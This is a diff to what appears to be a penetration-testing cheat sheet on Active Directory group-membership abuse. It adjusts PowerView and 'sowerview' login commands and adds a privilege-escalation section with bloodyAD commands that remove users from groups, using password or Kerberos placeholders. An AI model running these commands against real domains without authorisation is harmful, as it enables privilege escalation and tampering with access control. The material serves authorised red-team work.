@@ -31,7 +31,7 @@ bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> --dc-ip <DC_IP> add groupMember 
 
 ```console
 # With password
-sudo ntpdate -s <DC> && powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>'
+sudo ntpdate -s <DC_IP> && powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>'
 ```
 
 ```console {class="sample-code"}
@@ -44,7 +44,7 @@ PV >
 
 ```console
 # With Kerberos
-sudo ntpdate -s <DC> && sowerview '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -k --no-pass
+sudo ntpdate -s <DC_IP> && sowerview '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -k --no-pass
 ```
 
 #### 2. Add User to Group
@@ -83,5 +83,24 @@ MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-7682
 ```
 
 <small>*Ref: [powerview.py](https://github.com/aniqfakhrul/powerview.py)*</small>
+
+{{< /tabcontent >}}
+
+---
+
+### Privesc #2: Remove User from Group (From Linux)
+
+{{< tab set2 tab1 >}}bloodyAD{{< /tab >}}
+{{< tabcontent set2 tab1 >}}
+
+```console
+# With password
+bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> --dc-ip <DC_IP> remove groupMember '<GROUP>' '<TARGET_USER>'
+```
+
+```console
+# With Kerberos
+bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> --dc-ip <DC_IP> remove groupMember '<GROUP>' '<TARGET_USER>'
+```
 
 {{< /tabcontent >}}
